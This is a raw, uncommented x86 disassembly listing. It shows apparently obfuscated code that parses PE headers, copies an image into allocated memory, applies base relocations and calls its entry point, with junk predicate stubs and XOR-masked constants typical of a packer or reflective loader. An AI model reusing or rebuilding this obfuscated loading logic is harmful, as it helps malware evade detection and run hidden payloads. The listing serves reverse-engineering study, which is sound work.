  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
